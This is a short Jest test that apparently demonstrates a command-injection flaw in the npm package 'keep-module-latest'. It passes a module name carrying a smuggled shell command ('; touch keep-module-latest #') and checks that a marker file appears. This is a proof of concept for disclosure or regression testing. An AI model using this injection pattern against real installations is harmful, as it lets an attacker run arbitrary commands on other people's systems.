test("Remote code execution for keep-module-latest", (done) => {
  let fs = require('fs');
  let root = require('keep-module-latest');
  let path = "./keep-module-latest";
  if (fs.existsSync(path))
    fs.unlinkSync(path);

  var file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    root({ moduleName: "child_process; touch keep-module-latest #" })
      .catch(() => {})
      .finally(() => {});
  } catch (error) { }

  setTimeout(function() {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, (err) => { done(); });
  }, 3000);
});
